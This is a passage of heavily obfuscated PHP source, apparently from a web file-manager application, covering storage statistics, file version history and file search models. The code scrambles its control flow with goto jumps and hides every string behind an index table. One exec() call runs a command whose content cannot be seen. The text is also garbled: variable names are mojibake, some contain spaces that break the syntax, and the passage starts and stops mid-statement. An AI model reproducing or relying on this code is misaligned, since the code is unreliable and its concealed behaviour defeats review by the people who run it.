array($B÷ö«¢øõ’[1651] => array($B÷ö«¢øõ’[972], $F’Ã–ôÆ½ë)); $dÒŒ‘ÈÛµ¸ = (int) Model($B÷ö«¢øõ’[515])->where($B§‹¤ì÷·ğ)->count($B÷ö«¢øõ’[1529]); goto EÁ‡Š¦Ûöİ; Cä¸Ì œó…: $B÷ö«¢øõ’ =& $_SERVER[«¾°Ã¤]; $eÂ´—àµäÔ = Model($B÷ö«¢øõ’[515])->count($B÷ö«¢øõ’[1529]); $A¨‰½Æ‚Ò = Model($B÷ö«¢øõ’[515])->where($B÷ö«¢øõ’[1650])->count($B÷ö«¢øõ’[1529]); goto Dóğ»ÓŞ–¦; böÁ©’Õ›»: } private function optionFile() { goto B‘ÛˆÌ; B‘ÛˆÌ: $DğÉ‹ã‚¾ =& $_SERVER[«¾°Ã¤]; $cÏ„÷ˆÕ¡Ø = $this->sourceSize(); $fš°äã¿ÔÛ = $cÏ„÷ˆÕ¡Ø[$DğÉ‹ã‚¾[78]]; goto c­¡­ÊŠéË; bß³Ä‡ì›¼: $D³ëœìµŸ÷ = Model($DğÉ‹ã‚¾[799])->where($FÓ ¢šÓ–)->sum($DğÉ‹ã‚¾[78]); $CƒÍ°£ííµ = Model($DğÉ‹ã‚¾[799])->where($FÓ ¢šÓ–)->count($DğÉ‹ã‚¾[404]); return array($DğÉ‹ã‚¾[732] => $fš°äã¿ÔÛ, $DğÉ‹ã‚¾[1624] => $f·­«ôÊÓ‹, $DğÉ‹ã‚¾[1656] => $fš°äã¿ÔÛ - $f·­«ôÊÓ‹, $DğÉ‹ã‚¾[1657] => (int) $D³ëœìµŸ÷, $DğÉ‹ã‚¾[734] => (int) $CğÒŒáì†”, $DğÉ‹ã‚¾[1658] => (int) $CƒÍ°£ííµ); goto Eœ¤²´èö¹; c­¡­ÊŠéË: $f·­«ôÊÓ‹ = $cÏ„÷ˆÕ¡Ø[$DğÉ‹ã‚¾[1624]]; $CğÒŒáì†” = Model($DğÉ‹ã‚¾[799])->where(array($DğÉ‹ã‚¾[412] => 0))->count($DğÉ‹ã‚¾[404]); $FÓ ¢šÓ– = array($DğÉ‹ã‚¾[412] => 0, $DğÉ‹ã‚¾[194] => array($DğÉ‹ã‚¾[972], strtotime(date($DğÉ‹ã‚¾[1631])))); goto bß³Ä‡ì›¼; Eœ¤²´èö¹: } private function optionAccess() { $aÉ”Ú²×Ã¸ =& $_SERVER[«¾°Ã¤]; return array($aÉ”Ú²×Ã¸[728] => $this->typeLogCnt(), $aÉ”Ú²×Ã¸[107] => $this->typeLogCnt($aÉ”Ú²×Ã¸[107]), $aÉ”Ú²×Ã¸[439] => $this->typeLogCnt($aÉ”Ú²×Ã¸[439]), $aÉ”Ú²×Ã¸[1659] => $this->typeLogCnt($aÉ”Ú²×Ã¸[1659]), $aÉ”Ú²×Ã¸[1660] => $this->typeLogCnt($aÉ”Ú²×Ã¸[1660]), $aÉ”Ú²×Ã¸[571] => $this->typeLogCnt($aÉ”Ú²×Ã¸[33], $aÉ”Ú²×Ã¸[1635])); } private function typeLogCnt($E‰ŠØª¢’‘ = '', $cƒ·Óîø± = "\x69\x64") { goto B˜ÏÁÌ•‚ô; AØ«ïØ½: return (int) $bÊí¬ôÓ¦®; goto aÇóÖ¥ßŞß; DÉò³ÂŸ‡: $aÈœ¿¾Âğ¦ = array($CîÎÈéÇÌØ[194] => array($CîÎÈéÇÌØ[972], $CâíÙÅÁŞ¬)); if ($E‰ŠØª¢’‘) { $aÈœ¿¾Âğ¦[$CîÎÈéÇÌØ[29]] = array($CîÎÈéÇÌØ[7], $FÙùŠñŒ³‰[$E‰ŠØª¢’‘]); } $bÊí¬ôÓ¦® = Model($CîÎÈéÇÌØ[1634])->where($aÈœ¿¾Âğ¦)->count($cƒ·Óîø±); goto AØ«ïØ½; B˜ÏÁÌ•‚ô: $CîÎÈéÇÌØ =& $_SERVER[«¾°Ã¤]; $FÙùŠñŒ³‰ = array($CîÎÈéÇÌØ[107] => array($CîÎÈéÇÌØ[1661], $CîÎÈéÇÌØ[1662]), $CîÎÈéÇÌØ[439] => array($CîÎÈéÇÌØ[1663], $CîÎÈéÇÌØ[1664]), $CîÎÈéÇÌØ[1659] => array($CîÎÈéÇÌØ[1665], $CîÎÈéÇÌØ[1666], $CîÎÈéÇÌØ[1667]), $CîÎÈéÇÌØ[1660] => array($CîÎÈéÇÌØ[1668], $CîÎÈéÇÌØ[1669]), $CîÎÈéÇÌØ[1670] => array($CîÎÈéÇÌØ[1671], $CîÎÈéÇÌØ[1672], $CîÎÈéÇÌØ[1673])); $CâíÙÅÁŞ¬ = strtotime(date($CîÎÈéÇÌØ[1631])); goto DÉò³ÂŸ‡; aÇóÖ¥ßŞß: } private function optionServer() { goto cÅáÆŸ¦¹; DŠíã‘¤Ö: $c‹ÛÂ™ÎĞ = array($F‡©‰ğä Í[791] => $CïÛÑµŞ¿[$F‡©‰ğä Í[393]]); $fŠÀ·Á†…´ = Model($F‡©‰ğä Í[459])->where($c‹ÛÂ™ÎĞ)->sum($F‡©‰ğä Í[78]); $A—†¢½Îñß = explode($F‡©‰ğä Í[50], $_SERVER[$F‡©‰ğä Í[142]]); goto bº›ªŠƒƒ¡; cÅáÆŸ¦¹: $F‡©‰ğä Í =& $_SERVER[«¾°Ã¤]; $Bœ´ÕèˆŞ = $this->diskDriver(); $CïÛÑµŞ¿ = KodIO::defaultDriver(); goto DŠíã‘¤Ö; Fèµ¤„¡¶ï: if ($dÖ•ÄÏ¸ÍÁ == $F‡©‰ğä Í[764]) { $Fİéê¤–¸Ñ = explode($F‡©‰ğä Í[1168], $Cèî–ø¢È¢[$F‡©‰ğä Í[932]]); $dÖ•ÄÏ¸ÍÁ = $Fİéê¤–¸Ñ[0]; } if ($dÖ•ÄÏ¸ÍÁ == $F‡©‰ğä Í[767] || $dÖ•ÄÏ¸ÍÁ == $F‡©‰ğä Í[768]) { $C¢óŸ‘è‚È = Model()->db()->query($F‡©‰ğä Í[1674]); $fÚµ‹‚ÃñŸ = $C¢óŸ‘è‚È[0] && isset($C¢óŸ‘è‚È[0][$F‡©‰ğä Í[1433]]) ? $C¢óŸ‘è‚È[0][$F‡©‰ğä Í[1433]] : 0; $dÖ•ÄÏ¸ÍÁ = $F‡©‰ğä Í[1675] . ($fÚµ‹‚ÃñŸ ? $F‡©‰ğä Í[8] . $fÚµ‹‚ÃñŸ : $F‡©‰ğä Í[33]); } $e®‘ÚÑ‘¹õ = $GLOBALS[$F‡©‰ğä Í[6]][$F‡©‰ğä Í[347]][$F‡©‰ğä Í[801]]; goto AÂ¡¥Œ ¤”; bº›ªŠƒƒ¡: $b¦«õÀ†Œâ = $A—†¢½Îñß[0]; $Cèî–ø¢È¢ = $GLOBALS[$F‡©‰ğä Í[6]][$F‡©‰ğä Í[17]]; $dÖ•ÄÏ¸ÍÁ = $Cèî–ø¢È¢[$F‡©‰ğä Í[933]]; goto Fèµ¤„¡¶ï; AÂ¡¥Œ ¤”: return array($F‡©‰ğä Í[1676] => $Bœ´ÕèˆŞ ? $Bœ´ÕèˆŞ[$F‡©‰ğä Í[1677]] : 0, $F‡©‰ğä Í[1678] => $Bœ´ÕèˆŞ ? $Bœ´ÕèˆŞ[$F‡©‰ğä Í[1679]] : 0, $F‡©‰ğä Í[1680] => (int) $CïÛÑµŞ¿[$F‡©‰ğä Í[1677]] * 1024 * 1024 * 1024, $F‡©‰ğä Í[1681] => (int) $fŠÀ·Á†…´, $F‡©‰ğä Í[1682] => ucfirst($b¦«õÀ†Œâ), $F‡©‰ğä Í[1683] => $F‡©‰ğä Í[1684] . PHP_VERSION, $F‡©‰ğä Í[1685] => phpBuild64() ? 64 : 32, $F‡©‰ğä Í[727] => str_replace($F‡©‰ğä Í[1686], $F‡©‰ğä Í[949], $dÖ•ÄÏ¸ÍÁ), $F‡©‰ğä Í[347] => ucfirst($e®‘ÚÑ‘¹õ), $F‡©‰ğä Í[28] => $_SERVER[$F‡©‰ğä Í[1687]]); goto AÌ¿ ³; AÌ¿ ³: } private function diskDriver() { goto a¾‡ğîª; Cˆ„ÊíÙ×Ş: $AîÍ´Éà¡ = $bÖñ¡Ïáæ” - @disk_free_space($cİ‰Úõ¯ïÜ); return array($eãù¼ÈÀÒ¡[1677] => $bÖñ¡Ïáæ”, $eãù¼ÈÀÒ¡[1679] => $AîÍ´Éà¡); goto BÈÎÚÉç˜Õ; e´™‰²Çç¸: if ($aƒƒõ ×Ø†) { $cİ‰Úõ¯ïÜ = $eãù¼ÈÀÒ¡[1690]; if (function_exists($eãù¼ÈÀÒ¡[1691])) { exec($eãù¼ÈÀÒ¡[1692], $Díˆöî ƒÅ); $cİ‰Úõ¯ïÜ = $Díˆöî ƒÅ[1] . $eãù¼ÈÀÒ¡[8]; } } if (!file_exists($cİ‰Úõ¯ïÜ)) { return; } $bÖñ¡Ïáæ” = @disk_total_space($cİ‰Úõ¯ïÜ); goto Cˆ„ÊíÙ×Ş; a¾‡ğîª: $eãù¼ÈÀÒ¡ =& $_SERVER[«¾°Ã¤]; $cİ‰Úõ¯ïÜ = $eãù¼ÈÀÒ¡[8]; $aƒƒõ ×Ø† = $GLOBALS[$eãù¼ÈÀÒ¡[6]][$eãù¼ÈÀÒ¡[1688]] == $eãù¼ÈÀÒ¡[1689]; goto e´™‰²Çç¸; BÈÎÚÉç˜Õ: } public function fileChart($B“‘À—–óÙ) { goto Dç»°„; Dà§¢…ªœØ: $EÙèŸ‚ÖèÔ = $this->sourceSize(); $AÎÄ×Å–Â = array($e›•‹‰Ø«[487] => 0, $e›•‹‰Ø«[413] => 1); $AÙ‘Ğ©ÙŒõ = Model($e›•‹‰Ø«[799])->where($AÎÄ×Å–Â)->sum($e›•‹‰Ø«[78]); goto dª´ğİ‰Ñ“; Dç»°„: $e›•‹‰Ø« =& $_SERVER[«¾°Ã¤]; if (isset($B“‘À—–óÙ[$e›•‹‰Ø«[1529]])) { return Model($e›•‹‰Ø«[799])->userFileTypeProfile($B“‘À—–óÙ[$e›•‹‰Ø«[1529]]); } if (isset($B“‘À—–óÙ[$e›•‹‰Ø«[1693]])) { return Model($e›•‹‰Ø«[799])->groupFileTypeProfile($B“‘À—–óÙ[$e›•‹‰Ø«[1693]]); } goto Dà§¢…ªœØ; dª´ğİ‰Ñ“: $AÎÄ×Å–Â[$e›•‹‰Ø«[413]] = 2; $F»À£Æ„Ã³ = Model($e›•‹‰Ø«[799])->where($AÎÄ×Å–Â)->sum($e›•‹‰Ø«[78]); return array($e›•‹‰Ø«[732] => $EÙèŸ‚ÖèÔ[$e›•‹‰Ø«[78]], $e›•‹‰Ø«[1624] => $EÙèŸ‚ÖèÔ[$e›•‹‰Ø«[1624]], $e›•‹‰Ø«[1625] => (int) $AÙ‘Ğ©ÙŒõ, $e›•‹‰Ø«[1626] => (int) $F»À£Æ„Ã³); goto Aƒ©ÁÑİİÏ; Aƒ©ÁÑİİÏ: } private function sourceSize() { $B¡…Óè³ÄÖ =& $_SERVER[«¾°Ã¤]; $c£ŠÒÖ¯ß = Model($B¡…Óè³ÄÖ[799])->where(array($B¡…Óè³ÄÖ[412] => 0))->sum($B¡…Óè³ÄÖ[78]); $fÂïóÏŠ¤ƒ = Model($B¡…Óè³ÄÖ[459])->sum($B¡…Óè³ÄÖ[78]); if ($fÂïóÏŠ¤ƒ > $c£ŠÒÖ¯ß) { $fÂïóÏŠ¤ƒ = $c£ŠÒÖ¯ß; } return array($B¡…Óè³ÄÖ[78] => (int) $c£ŠÒÖ¯ß, $B¡…Óè³ÄÖ[1624] => (int) $fÂïóÏŠ¤ƒ); } } goto E”®¬¹•éµ; f›¼ƒˆÒ: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\165\x72\x63\145\137\x68\151\x73\x74\157\162\x79"; public function historyCount($b¸Œ£‡’ÁÁ) { goto d¦Ã¬ãŒ; d¦Ã¬ãŒ: $eñ³±Áè·´ =& $_SERVER[«¾°Ã¤]; if (!$b¸Œ£‡’ÁÁ) { return array(); } if (is_string($b¸Œ£‡’ÁÁ) || is_int($b¸Œ£‡’ÁÁ)) { $b¸Œ£‡’ÁÁ = array($b¸Œ£‡’ÁÁ); } goto a©›™ßÖÒ; a©›™ßÖÒ: $AÔŒÄïÛ = array($eñ³±Áè·´[404], $eñ³±Áè·´[1725] => $eñ³±Áè·´[489]); $fŒÑ¸äÀÇ“ = array($eñ³±Áè·´[404] => array($eñ³±Áè·´[7], $b¸Œ£‡’ÁÁ)); $A¡í“õĞé = $this->field($AÔŒÄïÛ)->where($fŒÑ¸äÀÇ“)->group($eñ³±Áè·´[404])->select(); goto f‹‰…Òº; f‹‰…Òº: return array_to_keyvalue($A¡í“õĞé, $eñ³±Áè·´[404], $eñ³±Áè·´[489]); goto eÙÌù¶¥¾ô; eÙÌù¶¥¾ô: } public function addHistory($e°‘­îîËâ, $E¶ÁºŞå¡º = '') { $aÆ¤éƒŞà‘ =& $_SERVER[«¾°Ã¤]; $dÜ—µÒĞØê = array($aÆ¤éƒŞà‘[419] => $e°‘­îîËâ[$aÆ¤éƒŞà‘[404]], $aÆ¤éƒŞà‘[1521] => isset($e°‘­îîËâ[$aÆ¤éƒŞà‘[443]]) ? $e°‘­îîËâ[$aÆ¤éƒŞà‘[443]] : $e°‘­îîËâ[$aÆ¤éƒŞà‘[441]], $aÆ¤éƒŞà‘[457] => $e°‘­îîËâ[$aÆ¤éƒŞà‘[456]], $aÆ¤éƒŞà‘[557] => $e°‘­îîËâ[$aÆ¤éƒŞà‘[78]], $aÆ¤éƒŞà‘[1921] => $E¶ÁºŞå¡º); $BßĞ¦ïß = $GLOBALS[$aÆ¤éƒŞà‘[6]][$aÆ¤éƒŞà‘[88]][$aÆ¤éƒŞà‘[1105]]; if ($BßĞ¦ïß > 1) { $this->historyAutoClear($dÜ—µÒĞØê[$aÆ¤éƒŞà‘[404]]); $this->add($dÜ—µÒĞØê); } Hook::trigger($aÆ¤éƒŞà‘[1922], $dÜ—µÒĞØê); Model($aÆ¤éƒŞà‘[1923])->eventFileEdit($e°‘­îîËâ[$aÆ¤éƒŞà‘[404]]); } private function historyAutoClear($Cº‹ö—Ë·¿) { goto b‡³ÖöˆÅ; b‡³ÖöˆÅ: $BÇïŒ±¬à =& $_SERVER[«¾°Ã¤]; $aèä ·¢ãà = Model($BÇïŒ±¬à[739])->get($BÇïŒ±¬à[1127]); $cÈ“ç†ëÏƒ = $GLOBALS[$BÇïŒ±¬à[6]][$BÇïŒ±¬à[88]][$BÇïŒ±¬à[1105]]; goto b®»ïÙ´×™; b®»ïÙ´×™: $AÖÊåöÅğ = $aèä ·¢ãà == $BÇïŒ±¬à[1128] ? 5 : $cÈ“ç†ëÏƒ; if ($cÈ“ç†ëÏƒ <= 1) { $AÖÊåöÅğ = 1; } if ($AÖÊåöÅğ >= 500) { return; } goto dÙİ±ê¢ä; dğ¼ìÄÑ: $FŞŒ»¤à† = array_slice($FŞŒ»¤à†, $AÖÊåöÅğ); if (!$D™›§ó©Ñà || !$FŞŒ»¤à†) { return; } $e›­˜®º› = array($BÇïŒ±¬à[421] => array($BÇïŒ±¬à[7], $D™›§ó©Ñà)); goto F’àæİ²ó´; F’àæİ²ó´: $this->where($e›­˜®º›)->delete(); Model($BÇïŒ±¬à[459])->remove($FŞŒ»¤à†); goto C·àŠßê™; dÙİ±ê¢ä: $e›­˜®º› = array($BÇïŒ±¬à[419] => $Cº‹ö—Ë·¿); $bğÕµ¾ò³ = $this->field($BÇïŒ±¬à[1924])->where($e›­˜®º›)->order($BÇïŒ±¬à[1918])->select(); if (!$bğÕµ¾ò³ || $AÖÊåöÅğ >= count($bğÕµ¾ò³)) { return; } goto Cìôõ«©ñ‹; Cìôõ«©ñ‹: $D™›§ó©Ñà = array_to_keyvalue($bğÕµ¾ò³, $BÇïŒ±¬à[33], $BÇïŒ±¬à[393]); $D™›§ó©Ñà = array_slice($D™›§ó©Ñà, $AÖÊåöÅğ); $FŞŒ»¤à† = array_to_keyvalue($bğÕµ¾ò³, $BÇïŒ±¬à[33], $BÇïŒ±¬à[456]); goto dğ¼ìÄÑ; C·àŠßê™: } public function listData($dÂÚ™Ó©¦) { goto cØóàùâ; E×™¸±¨ÇŠ: $EÔâ¸ÛøíÒ = $this->field($bÂè”¡†Ôœ)->where($A£ô¸–ò¹à)->order($cœğØ¹Ñ¨ç[1918])->selectPage(); $this->_listAppendUser($EÔâ¸ÛøíÒ[$cœğØ¹Ñ¨ç[367]]); $eÏƒ°”š‹é = Model($cœğØ¹Ñ¨ç[739])->get($cœğØ¹Ñ¨ç[1127]); goto D‹éÈí¬Ã; cØóàùâ: $cœğØ¹Ñ¨ç =& $_SERVER[«¾°Ã¤]; $A£ô¸–ò¹à = array($cœğØ¹Ñ¨ç[419] => $dÂÚ™Ó©¦); $bÂè”¡†Ôœ = $cœğØ¹Ñ¨ç[1925]; goto E×™¸±¨ÇŠ; D‹éÈí¬Ã: $bñ÷²ø‰¬ó = 5; if ($eÏƒ°”š‹é == $cœğØ¹Ñ¨ç[1128]) { $EÔâ¸ÛøíÒ[$cœğØ¹Ñ¨ç[367]] = array_slice($EÔâ¸ÛøíÒ[$cœğØ¹Ñ¨ç[367]], 0, $bñ÷²ø‰¬ó); $EÔâ¸ÛøíÒ[$cœğØ¹Ñ¨ç[364]] = array($cœğØ¹Ñ¨ç[1926] => 1, $cœğØ¹Ñ¨ç[1927] => 20, $cœğØ¹Ñ¨ç[1928] => 1, $cœğØ¹Ñ¨ç[1929] => count($EÔâ¸ÛøíÒ[$cœğØ¹Ñ¨ç[367]])); } return $EÔâ¸ÛøíÒ; goto aõ¦™¿¤½â; aõ¦™¿¤½â: } protected function _listAppendUser(&$bÀì†ô‰¼…) { $aÆÌ¡ù±ê =& $_SERVER[«¾°Ã¤]; $eÇŒÛ‹°â = array_to_keyvalue($bÀì†ô‰¼…, $aÆÌ¡ù±ê[33], $aÆÌ¡ù±ê[1529]); $BâµˆáÌ§ = Model($aÆÌ¡ù±ê[515])->userListInfo($eÇŒÛ‹°â); foreach ($bÀì†ô‰¼… as &$Fˆö™œï¢¬) { $E¨©­ê›À“ = $Fˆö™œï¢¬[$aÆÌ¡ù±ê[1529]]; $Fˆö™œï¢¬[$aÆÌ¡ù±ê[441]] = $BâµˆáÌ§[$E¨©­ê›À“] ? $BâµˆáÌ§[$E¨©­ê›À“] : !1; } unset($Fˆö™œï¢¬); } public function fileInfo($båÙÂ›°÷) { $C÷´½†‹¡Å =& $_SERVER[«¾°Ã¤]; $DÎÍğ©ö½Å = $this->tablePrefix; $c«±±‡ç² = "{$DÎÍğ©ö½Å}\x69\x6f\x5f\146\x69\154\145\x20\x66\x69\154\x65\163\40\x6f\x6e\x20\146\151\154\x65\163\x2e\146\x69\x6c\x65\111\104\40\x3d\40\150\x69\163\164\x6f\162\x79\x2e\x66\x69\x6c\145\111\x44"; return $this->alias($C÷´½†‹¡Å[1930])->where(array($C÷´½†‹¡Å[421] => $båÙÂ›°÷))->join($c«±±‡ç², $C÷´½†‹¡Å[1931])->find(); } public function removeItem($bõñ‡·ë´ƒ) { $e–¼äòƒä =& $_SERVER[«¾°Ã¤]; $c™×ÀÊøù = array($e–¼äòƒä[421] => $bõñ‡·ë´ƒ); $dº‰ô”—Ï³ = $this->where($c™×ÀÊøù)->find(); if ($dº‰ô”—Ï³) { $C·æ­ù›Êº = $this->where($c™×ÀÊøù)->delete(); Model($e–¼äòƒä[459])->remove($dº‰ô”—Ï³[$e–¼äòƒä[456]]); return $C·æ­ù›Êº; } return !1; } public function removeBySource($EÏõÒ¶´Ù‰) { goto a·‡ä°Ó™­; a·‡ä°Ó™­: $DÃä®åìå… =& $_SERVER[«¾°Ã¤]; if (!$EÏõÒ¶´Ù‰) { return !1; } if (!is_array($EÏõÒ¶´Ù‰)) { $EÏõÒ¶´Ù‰ = array($EÏõÒ¶´Ù‰); } goto F“è÷¾â¹ˆ; C›ªá§‡È“: return !0; goto B¡‡Ñá¸×ó; F“è÷¾â¹ˆ: $aÑÂ»³¯ = array($DÃä®åìå…[419] => array($DÃä®åìå…[7], $EÏõÒ¶´Ù‰)); $CŞóì™”Ôí = $this->field($DÃä®åìå…[457])->where($aÑÂ»³¯)->select(); if ($CŞóì™”Ôí) { $this->where($aÑÂ»³¯)->delete(); $fÎØ®÷¿¤ = array_to_keyvalue($CŞóì™”Ôí, $DÃä®åìå…[33], $DÃä®åìå…[456]); Model($DÃä®åìå…[459])->remove($fÎØ®÷¿¤); } goto C›ªá§‡È“; B¡‡Ñá¸×ó: } public function setDetail($fÕ‚ÚÙÁæÔ, $c‚½©¶øÎ) { $E²™èÛ Ñ =& $_SERVER[«¾°Ã¤]; return $this->where(array($E²™èÛ Ñ[421] => $fÕ‚ÚÙÁæÔ))->save(array($E²™èÛ Ñ[1921] => $c‚½©¶øÎ)); } public function rollbackToItem($d“‡°æÇŸ, $B¦æ‡ÏéŸ·) { goto dï¾ÅéßÈÃ; a£ÑÔàéî: return $this->where(array($c‹îÆ´†­[421] => $B¦æ‡ÏéŸ·))->delete(); goto fåĞ»ÔÊ°‡; dï¾ÅéßÈÃ: $c‹îÆ´†­ =& $_SERVER[«¾°Ã¤]; $DøƒÛ‚¹ß = Model($c‹îÆ´†­[799])->sourceInfo($d“‡°æÇŸ); $this->addHistory($DøƒÛ‚¹ß, LNG($c‹îÆ´†­[1932])); goto bëùºŒ·‘£; bëùºŒ·‘£: $E°Œ°’Õİ™ = $this->find($B¦æ‡ÏéŸ·); $BÑùÄÉ“³ã = array($c‹îÆ´†­[456] => $E°Œ°’Õİ™[$c‹îÆ´†­[456]], $c‹îÆ´†­[78] => $E°Œ°’Õİ™[$c‹îÆ´†­[78]], $c‹îÆ´†­[84] => time(), $c‹îÆ´†­[443] => USER_ID); Model($c‹îÆ´†­[799])->where(array($c‹îÆ´†­[404] => $d“‡°æÇŸ))->save($BÑùÄÉ“³ã); goto a£ÑÔàéî; fåĞ»ÔÊ°‡: } public function clearSame($f¨Òë½±Ë) { goto dË›ç˜ëÒæ; dË›ç˜ëÒæ: $bÁøçğÖôÚ =& $_SERVER[«¾°Ã¤]; $dÙ¯©ÖÎá = $this->listData($f¨Òë½±Ë); $D…Ü”–†äå = array_to_keyvalue_group($dÙ¯©ÖÎá, $bÁøçğÖôÚ[456]); goto FİğÊİğÑ—; FİğÊİğÑ—: $B¶†ÉÙ¨õ— = array(); $e‹…•ĞÑø« = array(); foreach ($D…Ü”–†äå as $eÁí¹èÙô) { if (!$eÁí¹èÙô || count($eÁí¹èÙô) <= 1) { continue; } foreach ($eÁí¹èÙô as $b‘Ú©öËò) { $B¶†ÉÙ¨õ—[] = $b‘Ú©öËò[$bÁøçğÖôÚ[456]]; $e‹…•ĞÑø«[] = $b‘Ú©öËò[$bÁøçğÖôÚ[393]]; } } goto B¬´Ì“¶ ; B¬´Ì“¶ : if (!$e‹…•ĞÑø«) { return; } $this->where(array($bÁøçğÖôÚ[393] => array($bÁøçğÖôÚ[7], $e‹…•ĞÑø«)))->delete(); Model($bÁøçğÖôÚ[459])->remove($B¶†ÉÙ¨õ—); goto A¸ñŸ—ù‘Ê; A¸ñŸ—ù‘Ê: } public function userSpace() { $F¢ª‚ªì¤Å =& $_SERVER[«¾°Ã¤]; $AóÒç»ĞÀ” = $this->tablePrefix; $e †Ü³Ş¥ = array($F¢ª‚ªì¤Å[1521] => USER_ID); $AÅÀ¹—”Ü° = "{$AóÒç»ĞÀ”}\x69\x6f\137\x66\x69\154\x65\x20\x66\151\x6c\x65\163\x20\157\156\40\x66\151\x6c\145\163\x2e\146\x69\x6c\145\111\x44\40\x3d\x20\x68\151\x73\x74\x6f\162\x79\x2e\146\x69\x6c\x65\111\x44"; return $this->alias($F¢ª‚ªì¤Å[1930])->where($e †Ü³Ş¥)->join($AÅÀ¹—”Ü°, $F¢ª‚ªì¤Å[1931])->sum($F¢ª‚ªì¤Å[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($fù×±ë¶É¿) { goto EÔÜØÄ«µ; AÜßÀ‰İ¹„: if (!$dÌ‘Î‰‚ÓÚ) { return array(); } $f¸¾¡×ßæÙ = $dÌ‘Î‰‚ÓÚ[$eÒÎöÊÂ†[168]]; $f´×Ùãƒ‰õ = $eÒÎöÊÂ†[7]; goto f¨´³Ô·¸Ô; f¨´³Ô·¸Ô: if (!$dÌ‘Î‰‚ÓÚ[$eÒÎöÊÂ†[168]]) { $DéÅ‘§‰áì = array_to_keyvalue($c˜›†‡«Œš, $eÒÎöÊÂ†[33], $eÒÎöÊÂ†[168]); $f¸¾¡×ßæÙ = implode($eÒÎöÊÂ†[47], $DéÅ‘§‰áì); $f´×Ùãƒ‰õ = $eÒÎöÊÂ†[1933]; } $dŞ•ùæƒ… = explode($eÒÎöÊÂ†[47], trim($f¸¾¡×ßæÙ, $eÒÎöÊÂ†[47])); return array($f´×Ùãƒ‰õ, $dŞ•ùæƒ…); goto Aë“ô­Û¸¿; EÔÜØÄ«µ: $eÒÎöÊÂ† =& $_SERVER[«¾°Ã¤]; $c˜›†‡«Œš = KodIO::fileTypeList(); $dÌ‘Î‰‚ÓÚ = $c˜›†‡«Œš[$fù×±ë¶É¿]; goto AÜßÀ‰İ¹„; Aë“ô­Û¸¿: } public function listPathType($AÚùÄÑÇİÂ) { $d—ã¥÷¾‡… =& $_SERVER[«¾°Ã¤]; $C­¥—Õùî§ = $this->fileTypeWhere($AÚùÄÑÇİÂ); if (!$C­¥—Õùî§) { return array(); } $a–á™„ùÎó = array($d—ã¥÷¾‡…[558] => SourceModel::TYPE_USER, $d—ã¥÷¾‡…[559] => USER_ID, $d—ã¥÷¾‡…[555] => 0, $d—ã¥÷¾‡…[556] => $C­¥—Õùî§); return $this->listSource($a–á™„ùÎó); } public function listSearch($AğøºÚç¼’, $CÅ—¹Œ¦Æ = 300) { goto d¢â°ùÆŒÆ; d¢â°ùÆŒÆ: $f³Í‰ÀòĞ =& $_SERVER[«¾°Ã¤]; if (isset($AğøºÚç¼’[$f³Í‰ÀòĞ[1776]]) && $AğøºÚç¼’[$f³Í‰ÀòĞ[1776]]) { $AğøºÚç¼’[$f³Í‰ÀòĞ[1776]] = str_replace($f³Í‰ÀòĞ[381], $f³Í‰ÀòĞ[1934], trim($AğøºÚç¼’[$f³Í‰ÀòĞ[1776]])); } $c¥óŸ’æÓÃ = $this->_parseSearchWhere($AğøºÚç¼’); goto fíø¯Ä§; B½‹¬–îö: $this->_listMake($EÏ¨®¤º™µ); return $EÏ¨®¤º™µ; goto d»éŞéÖ‚; c””µÜéÍ¸: $EÏ¨®¤º™µ = $this->distinct(!0)->field($F³â‡êÄƒ)->where($c¥óŸ’æÓÃ)->selectPage($CÅ—¹Œ¦Æ); $this->_listSearchFileContent($EÏ¨®¤º™µ, $AğøºÚç¼’, $dŒ·»£ğ°); $this->_listSearchDesc($EÏ¨®¤º™µ, $AğøºÚç¼’, $dŒ·»£ğ°); goto FˆÒç‘æÃ‹; fíø¯Ä§: if (!isset($c¥óŸ’æÓÃ[$f³Í‰ÀòĞ[432]])) { $c¥óŸ’æÓÃ[$f³Í‰ÀòĞ[432]] = 0; } $F³â‡êÄƒ = $f³Í‰ÀòĞ[1935]; $dŒ·»£ğ° = $F³â‡êÄƒ; goto C…Ï·Õ¿ŒË; C…Ï·Õ¿ŒË: $this->_listSearchBindPinyin($AğøºÚç¼’, $c¥óŸ’æÓÃ, $F³â‡êÄƒ); $this->alias($f³Í‰ÀòĞ[525])->_makeOrder(); $c¥óŸ’æÓÃ = $this->parseWhereLike($c¥óŸ’æÓÃ); goto c””µÜéÍ¸; FˆÒç‘æÃ‹: $this->_listSearchTag($EÏ¨®¤º™µ, $AğøºÚç¼’, $dŒ·»£ğ°); $this->_listSearchGroupTag($EÏ¨®¤º™µ, $AğøºÚç¼’, $dŒ·»£ğ°); $this->_listDataApply($EÏ¨®¤º™µ[$f³Í‰ÀòĞ[367]]); goto B½‹¬–îö; d»éŞéÖ‚: } private function _listSearchFileContent(&$AÅ¢â«ÆÃ¯, $Dª¶…¬Ã‹ñ, $F³•¾ Î¥Ş) { goto d±¤Şé·µÃ; BŞÏĞï‹ß•: unset($Dª¶…¬Ã‹ñ[$eë¼ÓĞ‡½ğ[456]]); $DâæÊ•¿Çï = $this->field($F³•¾ Î¥Ş)->where($FÙ™èïõ²ñ)->limit($eë¼ÓĞ‡½ğ[1936])->select(); if (!$DâæÊ•¿Çï || count($DâæÊ•¿Çï) == 0) { return; } goto b©°Æ‘Äğ; b©°Æ‘Äğ: $AÅ¢â«ÆÃ¯[$eë¼ÓĞ‡½ğ[367]] = array_merge($DâæÊ•¿Çï, $AÅ¢â«ÆÃ¯[$eë¼ÓĞ‡½ğ[367]]); $AÅ¢â«ÆÃ¯[$eë¼ÓĞ‡½ğ[364]][$eë¼ÓĞ‡½ğ[365]] += count($DâæÊ•¿Çï); goto CÀ™ÔÃ†›ö; d±¤Şé·µÃ: $eë¼ÓĞ‡½ğ =& $_SERVER[«¾°Ã¤]; if (!$Dª¶…¬Ã‹ñ[$eë¼ÓĞ‡½ğ[1776]] || $AÅ¢â«ÆÃ¯[$eë¼ÓĞ‡½ğ[364]][$eë¼ÓĞ‡½ğ[351]] > 1) { return; } $FÙ™èïõ²ñ = $this->_parseSearchWhere($Dª¶…¬Ã‹ñ); goto Ešá†øÎ; Ešá†øÎ: if (!isset($FÙ™èïõ²ñ[$eë¼ÓĞ‡½ğ[28]]) || !is_array($Dª¶…¬Ã‹ñ[$eë¼ÓĞ‡½ğ[456]])) { return; } $FÙ™èïõ²ñ[$eë¼ÓĞ‡½ğ[456]] = array($eë¼ÓĞ‡½ğ[7], 